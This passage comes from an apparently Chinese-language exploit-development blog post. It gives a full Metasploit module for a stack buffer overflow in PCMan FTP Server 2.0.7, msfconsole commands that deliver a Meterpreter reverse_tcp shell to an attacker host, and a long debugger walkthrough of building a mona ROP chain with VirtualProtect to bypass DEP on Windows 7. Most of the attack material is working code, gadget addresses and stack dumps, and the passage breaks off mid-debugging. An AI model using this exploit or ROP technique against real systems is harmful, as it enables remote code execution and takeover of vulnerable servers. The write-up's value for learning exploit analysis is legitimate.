              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          &#39;Author&#39;         =&amp;gt;
              [
                &#39;quanyechavshuo&#39;
              ],
          &#39;License&#39;        =&amp;gt; MSF_LICENSE,
          &#39;References&#39;     =&amp;gt;
            [
              [ &#39;EDB&#39;,   &#39;37731&#39;],
              [ &#39;OSVDB&#39;,   &#39;94624&#39;]
            ],
          &#39;DefaultOptions&#39; =&amp;gt;
            {
              &#39;EXITFUNC&#39; =&amp;gt; &#39;process&#39;
            },
          &#39;Payload&#39;        =&amp;gt;
            {
              &#39;Space&#39;   =&amp;gt; 1000,
              &#39;BadChars&#39;  =&amp;gt; &quot;\x00\x0A\x0D&quot;,
            },
          &#39;Platform&#39;       =&amp;gt; &#39;win&#39;,
          &#39;Targets&#39;        =&amp;gt;
            [
              [ &#39;windows 7 x64&#39;,
                {
                  &#39;Ret&#39; =&amp;gt; 0x776c2fe1, # jmp esp C:\WINDOWS\system32\ntdll.dll
                  &#39;Offset&#39; =&amp;gt; 2008
                }
              ],
            ],
          &#39;DisclosureDate&#39; =&amp;gt; &#39;Aug 07 2015&#39;,
          &#39;DefaultTarget&#39;  =&amp;gt; 0))
      end
    
      def check
        connect_login
        disconnect
    
        if /220 PCMan&#39;s FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end
    
    
      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
    
        sploit &amp;lt;&amp;lt; [target.ret].pack(&#39;V&#39;)
        sploit &amp;lt;&amp;lt; make_nops(16)
        sploit &amp;lt;&amp;lt; payload.encoded
    
        tmp=sploit
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    
    end
    ---------------------------end--------------------------------------

exploit情况说明:
    1.在实际msf中加载上面的exploit时,发现要应该对应第2009个字节开始为填充的jmp esp的地址,也即exploit代码中的填充随机覆盖的数据要有2008个,而不是原来认为的2007个
    2.出现1中的情况认为可能是考虑覆盖偏移量时不应该从AAAA开始,要从ls命令开始,也即ls AAAA开始算
    3.上面代码中没有发送共9000个字节的数据,用反弹的shellcode代替也可成功
    4.win7系统重启后,jmp esp地址会改变,重启后代码中的jmp esp的地址不再合适
    5.将上面的代码重命名为mypcmanftp.rb,放到kali中/usr/share/metasploit-framework/moudles/exploits/windows/my/目录下,使用如下命令:
            use exploit/windows/my/mypcmanftp
            set payload windows/meterpreter/reverse_tcp
            set rhost 192.168.3.177
            set lhost 192.168.3.106
            exploit
      成功溢出后返回meterpreter的shell如下图meterpreter1,其中打印出来的数据为代码中print_status(tmp)的结果,即payload的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图meterpreter1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/meterpreter1.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dep-on&quot;&gt;2&amp;gt;dep on&lt;/h4&gt;

&lt;p&gt;实验中win7x64系统中dep开启如下:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dep_open_on_win7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;参考
http://www.blogbus.com/riusksk-logs/80935313.html
http://drops.wooyun.org/papers/3602

目的
实现win7绕过dep并成功溢出pcmanftp

mona插件
    https://github.com/corelan/mona
    https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
    https://huirong.github.io/2015/12/18/mona/
    http://www.cnphp6.com/archives/45078
    http://drops.wooyun.org/tips/6814

在immunity debugger中执行!mona rop -m *.dll -cp nonull,将得到如下(rop_chains.txt中)建议的rop_gadgets:

-------------rop_gadgets_from_mona____________
def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x027c9a7a,  # POP ECX # RETN [knb3rdhmpg.dll] 
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
      0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
      0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
      0x7727060d,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
      0x027f509d,  # POP EAX # RETN [knb3rdhmpg.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x717d1e67,  # NEG EAX # RETN [winrnr.dll] 
      0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
      0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
      0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
      0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
      0x90909090,  # nop
      0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
    ].flatten.pack(&quot;V*&quot;)

    return rop_gadgets

  end
------------------end-------------------------

在pcmanftp中,重启系统后在上面的exploit.rb中将offset由2007改成2008,有可能是重启导致的一个字节的相差

mona中给出rop_gadgets只是参考的rop,并不代表一定可用,且最新v2版本似乎有点错误,mona算出的rop_gadgets中的第一个地址0x027c9a7a在od中ctrl+g查看一下发现不是对应pop ecx,retn的地址,且有一些地址是执行会产生问题的,这时需要结合od在实际情况中调试

实际调试中发现上面的第10个地址0x7727060d对应的XCHG EAX,EBX+retn在od中ctrl+g:7727060d确实是对应xchg eax,ebx+retn指令的,但是如果第10个地址用7727060d,在od跟踪pcmanftp(在402a26处下断,并f7,再f8,f8,...)中00402a26处的call 403e60后(402a26处的call 403e60汇编语句的下一句汇编语句的地址为402a2b,在上面dep off的实验中是堆栈窗口中的18ed64处的402a2b被改成jmp esp的地址)发现堆栈窗口中从18ed64处开始的对应的第10个地址会被改写,比较奇怪,认为是这个地址出了问题,从rop_suggestions.txt中找另外的XCHG EAX,EBX+RETN对应的地址代替后不会有这个问题

pcmanftp中的关键断点:
    00402a26处的call 403e60
        403e60函数帧里面的403ee6处的call 00412cbf
            412cbf函数帧里面的412ce8处的call 00416c5c

继续od跟踪看哪些地址还需修改

运行pcmanftp后od附加,在00402a26处下断,msf发送包含下面rop_gadgets的数据到192.168.3.177

------------------changing rop_gadgets--------------
   def create_rop_chain()
        rop_gadgets = 
        [
          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
          0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
          0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
          0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
          0x90909090,  # nop
          0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
        ].flatten.pack(&quot;V*&quot;)
        return rop_gadgets
      end
-----------------------end--------------------------

其中向192.168.3.177中pcmanftp发送的数据在下面的sploit变量中:

-----------------------sploit---------------------
     sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        sploit &amp;lt;&amp;lt; make_nops(30)
        sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
------------------------end-----------------------

在msf发送完数据时,要在od中ctrl+v---&amp;gt;t---&amp;gt;resume all threads,原因见上面dep off情况中的分析
resume all threads后,pcmanftp中断在00402a26,f9再运行到00402a26,此时开始处理sploit变量中的send_cmd( [&quot;ls&quot;, sploit], false ),第一次中断到402a26处为处理anonymous登录相关的字符串
此时汇编窗口中的数据如下所示,eip=402a26

    00402A26    E8 35140000     call PCManFTP.00403E60
    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
    00402A2E    84C0            test al,al
    00402A30    75 04           jnz short PCManFTP.00402A36
    00402A32    C646 03 20      mov byte ptr ds:[esi+0x3],0x20
    00402A36    56              push esi
    00402A37    8BCD            mov ecx,ebp
    00402A39    E8 22000000     call PCManFTP.00402A60
    00402A3E    68 DC114400     push PCManFTP.004411DC                   ; ASCII &quot;
    &quot;
    00402A43    6A 00           push 0x0
    00402A45    E8 0CFF0000     call PCManFTP.00412956
    00402A4A    8BF0            mov esi,eax
    00402A4C    83C4 08         add esp,0x8
    00402A4F    85F6            test esi,esi
    00402A51  ^ 75 A6           jnz short PCManFTP.004029F9
    00402A53    5F              pop edi                                  ; 0018ED78
    00402A54    5E              pop esi                                  ; 0018ED78
    00402A55    5D              pop ebp                                  ; 0018ED78
    00402A56    81C4 04100000   add esp,0x1004
    00402A5C    C2 0400         retn 0x4

此时堆栈中18ed64处的返回地址还没有被覆盖,如下所示:

    0018ED5C   00000000
    0018ED60   00000000
    0018ED64   00402A05  PCManFTP.00402A05
    0018ED68   0018ED78  ASCII &quot;LS XnVkIvmqpcmSqSVEClMqFIHQzEBjHrHLdzEnDtwxDnbcqTqseEHLARmjMQrGaiNEnQpxxbUisIZaqPwjoePQmmCPMzhAZDIhYffDXdhLCrWCyhuidqcfuMFhMZecDDopTpMGWcQShqwfgLoDFfnSHbUvoEMVuDLiFEYfaTFfCAAoDuwasvaujuFloUrmoYzyyWqkvXOxkMBqUsTwpPZkbQalYgrryMvEeYywOCAiJv&quot;...
    0018ED6C   00000402
    0018ED70   00000000

其中0018ed5c处的返回地址已经被覆盖成00000000,18ed68处的的指针对应的是msf中的sploit变量的数据
od中f7进入403e60函数帧:

    00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
    00403E65    81EC 14080000   sub esp,0x814
    00403E6B    85C0            test eax,eax
    00403E6D    56              push esi
    00403E6E    57              push edi
    00403E6F    8BF1            mov esi,ecx
    00403E71    75 0D           jnz short PCManFTP.00403E80
    00403E73    A1 48354400     mov eax,dword ptr ds:[0x443548]
    00403E78    85C0            test eax,eax
    00403E7A    0F84 31010000   je PCManFTP.00403FB1
    00403E80    8D4424 08       lea eax,dword ptr ss:[esp+0x8]
    00403E84    50              push eax
    00403E85    FF15 A8524300   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLocalTi&amp;gt;; kernel32.GetLocalTime
    00403E8B    8B46 24         mov eax,dword ptr ds:[esi+0x24]
    00403E8E    85C0            test eax,eax
    00403E90    74 05           je short PCManFTP.00403E97
    00403E92    8B40 08         mov eax,dword ptr ds:[eax+0x8]
    00403E95    EB 03           jmp short PCManFTP.00403E9A
    00403E97    8B46 04         mov eax,dword ptr ds:[esi+0x4]
    00403E9A    8BBC24 20080000 mov edi,dword ptr ss:[esp+0x820]
    00403EA1    8B5424 12       mov edx,dword ptr ss:[esp+0x12]
    00403EA5    8B4E 0C         mov ecx,dword ptr ds:[esi+0xC]
    00403EA8    57              push edi
    00403EA9    50              push eax
    00403EAA    8B4424 18       mov eax,dword ptr ss:[esp+0x18]
    00403EAE    81E2 FFFF0000   and edx,0xFFFF
    00403EB4    51              push ecx
    00403EB5    8B4C24 1A       mov ecx,dword ptr ss:[esp+0x1A]
    00403EB9    25 FFFF0000     and eax,0xFFFF
    00403EBE    52              push edx
    00403EBF    8B5424 1A       mov edx,dword ptr ss:[esp+0x1A]
    00403EC3    50              push eax
    00403EC4    8B4424 1C       mov eax,dword ptr ss:[esp+0x1C]
    00403EC8    81E1 FFFF0000   and ecx,0xFFFF
    00403ECE    81E2 FFFF0000   and edx,0xFFFF
    00403ED4    51              push ecx
    00403ED5    25 FFFF0000     and eax,0xFFFF
    00403EDA    52              push edx
    00403EDB    50              push eax
    00403EDC    8D4C24 3C       lea ecx,dword ptr ss:[esp+0x3C]
    00403EE0    68 D4164400     push PCManFTP.004416D4                   ; ASCII &quot;%d/%d/%d [%02d:%02d] (%05d) %s&amp;gt; %s
    &quot;
    00403EE5    51              push ecx
    00403EE6    E8 D4ED0000     call PCManFTP.00412CBF
    00403EEB    8B0D 14354400   mov ecx,dword ptr ds:[0x443514]
    00403EF1    83C4 28         add esp,0x28
    00403EF4    83F9 FF         cmp ecx,-0x1
    00403EF7    74 14           je short PCManFTP.00403F0D
    00403EF9    8D5424 18       lea edx,dword ptr ss:[esp+0x18]
    00403EFD    6A 00           push 0x0
    00403EFF    52              push edx
    00403F00    50              push eax
    00403F01    8D4424 28       lea eax,dword ptr ss:[esp+0x28]
    00403F05    50              push eax
    00403F06    51              push ecx
    00403F07    FF15 C8524300   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.WriteFile&amp;gt;&amp;gt;; kernel32.WriteFile
    00403F0D    A1 48354400     mov eax,dword ptr ds:[0x443548]
    00403F12    85C0            test eax,eax
    00403F14    0F84 97000000   je PCManFTP.00403FB1
    00403F1A    E8 1FCC0100     call PCManFTP.00420B3E
    00403F1F    85C0            test eax,eax
    00403F21    0F84 8A000000   je PCManFTP.00403FB1
    00403F27    8B10            mov edx,dword ptr ds:[eax]
    00403F29    8BC8            mov ecx,eax
    00403F2B    FF52 74         call dword ptr ds:[edx+0x74]
    00403F2E    85C0            test eax,eax
    00403F30    74 7F           je short PCManFTP.00403FB1
    00403F32    0FBE07          movsx eax,byte ptr ds:[edi]
    00403F35    50              push eax
    00403F36    E8 25EF0000     call PCManFTP.00412E60
    00403F3B    83C4 04         add esp,0x4
    00403F3E    85C0            test eax,eax
    00403F40    74 4A           je short PCManFTP.00403F8C
    00403F42    E8 F7CB0100     call PCManFTP.00420B3E
    00403F47    85C0            test eax,eax
    00403F49    74 23           je short PCManFTP.00403F6E
    00403F4B    8B10            mov edx,dword ptr ds:[eax]
    00403F4D    8BC8            mov ecx,eax
    00403F4F    FF52 74         call dword ptr ds:[edx+0x74]
    00403F52    8D4C24 1C       lea ecx,dword ptr ss:[esp+0x1C]
    00403F56    51              push ecx
    00403F57    68 00800000     push 0x8000
    00403F5C    8BC8            mov ecx,eax
    00403F5E    E8 8D5D0000     call PCManFTP.00409CF0
    00403F63    5F              pop edi                                  ; PCManFTP.00402A2B
    00403F64    5E              pop esi                                  ; PCManFTP.00402A2B
    00403F65    81C4 14080000   add esp,0x814
    00403F6B    C2 0400         retn 0x4

一直f8到上面403ee6处的call 00412cbf,暂时不跟进,再按f8之后将完成18ed64处的返回地址被覆盖
f8后18ed64处的覆盖内容如下:
    
    0018ED5C   564F514E  #此时此处的原来被覆盖成00000000的wsock.revc函数的返回地址被覆盖成另外的值
    0018ED60   6475586A
    0018ED64   778A45E1  返回到 ntdll_12.778A45E1 来自 ntdll_12.DbgPrint
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   772B73DF  oleaut32.772B73DF
    0018EDB8   939F4848
    0018EDBC   3F9BD691
    0018EDC0   4E274E37
    0018EDC4   D6439937
    0018EDC8   4B484393
    0018EDCC   91FDF948
    0018EDD0   479FFC4E
    0018EDD4   F8CC4691

其中rop_gadgets数据已经完全和发送的一样,而rop_gadgets后0018edb8处开始到0018edd5原来应该是30个nop+&quot;\xcc&quot;,其中的30个nop数据不是nop数据了,&quot;\xcc&quot;没变

在od中ctrl+f9运行到retn,然后再f8,此时eip=rop_gadgets中第一个数据,然后再f8..f8看看哪里会出问题

f8跟踪到0018edb4处的772b73df,772b73df中的指令为pushad retn,可想,执行完pushad后esp就上移了,这样再retn的话retn到的便不是rop_gadgets中的原来的应该是30个nop处的地方(现在被改写了,不再是30个nop)

觉得是mona的错误,不应该在最后加个poshad+retn的地址,将rop_gadgets中最后的pushad+retn的地址删除后再重新发送sploit数据并跟踪到rop_gadgets中第一个数据,然后再f8..f8看看哪里会出问题

再次进入到rop_gadgets中的第一个地址778a45e1处,此时eip=778a45e1,堆栈窗口中的18ed64处的数据为:

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   4A4E96F5
    0018EDB8   4841F59B
    0018EDBC   48FD4B99
    0018EDC0   93909899
    0018EDC4   93989B4F
    0018EDC8   904242F9
    0018EDCC   98379648
    0018EDD0   90CC2797

对比观察发现rop_gadgets中的地址还没开始执行(eip=778a45e1)时,后面的rop_gadgets数据不变,但是后面30个nop还是被改成其他数据,尝试将后面的30个nop改成41414141...再次跟踪到eip=rop_gadgets中的第一个地址778a45e1时,堆栈窗口中的数据如下:

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   41414141
    0018EDB8   41414141
    0018EDBC   41414141
    0018EDC0   41414141
    0018EDC4   41414141
    0018EDC8   41414141
    0018EDCC   41414141
    0018EDD0   4FCC4141

发现这时后面的30个41还是正常的没有被改变的,这样说明应该是win7x64位系统下开户dep后,栈中覆盖好的nop串会被改变成其他随机的填充数据,也有可能是nop串太长为30个时才会这样,考虑到上一篇文中

http://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/

提到msf的payload前面有可能需要至少9个nop空间帮助完成payload的解码等工作,将30个nop改成9个nop试试9个nop会不会被改成随机的填充数据

再次重新跟踪到eip=rop_gadgets中的第一个地址时,18ed64处的数据为:

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   4E43F842
    0018EDB8   D64348F9
    0018EDBC   4B46CCFD

发现9个nop还是会被填充成随机数据(后来发现不是被win7x64系统的安全保护填充的,而是因为msf自带的nop有好几种,不只是9090,其他应该是类似的花指令),\xcc到是一直没有被改写,试着不要9个nop了,将原来rop_gadges中的pushad+retn指令的地址改成一条jmp esp指令的地址,并在该地址后接payload数据,上面的dep off时的exploit.rb中的jmp esp的地址76061b1b在dep on时为call esp汇编语句的地址,不用在od中查找其他的了,call esp也可跳到后面的pyaload执行

发送如下的rop_gadgets数据+不要nop+不要\xcc的数据到pcmanftp:

---------------sploit data-------------
def create_rop_chain()
        rop_gadgets = 
        [
          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
          0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
          0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
          0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
          0x90909090,  # nop
          #0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
          0x76061b1b,  #call esp
        ].flatten.pack(&quot;V*&quot;)
        return rop_gadgets
      end


      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        #sploit &amp;lt;&amp;lt; make_nops(9)
        #sploit &amp;lt;&amp;lt; &quot;\x41&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
    
        tmp=sploit
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    end
-------------------end-----------------

再次跟踪到rop_gadges中的第一个地址,再f8直到上面sploit变量中的rop_gadget中的最后一个地址call esp的地址处程序报错,异常偏移为00a31b1b,难道是rop_gadgets中的地址串执行后没有实现后面的payload为栈中可执行?

再次跟踪到rop_gadgets中的所有地址,发现最后jmp esp执行后程序报错,报出0018edb8处为异常偏移,而0018edb8处为payload开始的对应的堆栈窗口中地址,且每次0018edb8中的数据都不同,难道连payload都被随机数填充了?

有比较大的可能性是执行完上面的rop_gadgets中的地址对应的指令后没有实现payload在栈中可执行,难道是不应该把mona生成的rop_gadges中的最后的pushad+retn对应的地址换成jmp esp的地址?

再看看相关mona的资料,后面的pushad + retn应该是存在的,具体原因见下图virtualprotect_rop中所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图virtualprotect_rop
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/virtualprotect_rop.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mona生成的rop_gadgets中的最后一句中的pushad+retn指令的地址是必须的,正是通过pushad+retn的执行才可以导致virtualprotect的执行,实现的原理是在pushad之前将pushad的各个寄存器按照对应的顺序设置成刚好可以调用virtualprotect函数使后面的shellcode为可执行
后来调试在进入virtualprotect_rop前最后一个函数00403e60的返回语句是retn 4而不是retn,所以rop_gadgets中的第一个地址后要加一个过渡的值,这里取为0x41414141

----------------------------00403e60--------------------------------
    00402A26    E8 35140000     call PCManFTP.00403E60
    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
    
        
        00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
        00403E65    81EC 14080000   sub esp,0x814
        00403E6B    85C0            test eax,eax
        ...
        ...
        ...
        00403FB1    5F              pop edi                                  ; kernel32.77032C3B
        00403FB2    5E              pop esi                                  ; kernel32.77032C3B
        00403FB3    81C4 14080000   add esp,0x814
        00403FB9    C2 0400         retn 0x4
-------------------------------end-----------------------------------

在mona生成的最后rop_chains.txt文件中有virutalalloc过dep的rop_gadgets,也有virtualprotect过dep的rop_gadgets,刚开始以为是mona出错了,后来发现是用到了mona里面的virtualalloc过dep方式
0day2中提到下面几种方法过dep:
1.ZwSetInformationProcess:利用api彻底关闭dep
2.VirtualProtect:利用api设置shellcode所在的内存空间为可执行
3.VirtualAlloc:利用api申请可执行内存后将shellcode复制过去(需再用memcopy的api)
4.利用可执行内存挑战dep
5.利用.NET挑战dep
6.利用Java applet挑战dep
这里用的是2中的virtualprotect中的方法,mona生成的virtualalloc的方法应该是缺少了memcopy的chain,导致刚开始一直错误地以为mona错了
最后再用mona生成的rop_gadgets如下:(第二个地址为新添加的0x41414141)
--------------------new_rop_gadgets--------------------
    rop_gadgets = 
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
      0x41414141,  # added data to fit retn 4 from func 00403e60
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
      0xffffddff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
      0x7647c663,  # &amp;amp;Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 
    ].flatten.pack(&quot;V*&quot;)
------------------------end----------------------------
再次开msf发payload,od附加,调试时发现如下图ebx_error错误
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;图ebx_error
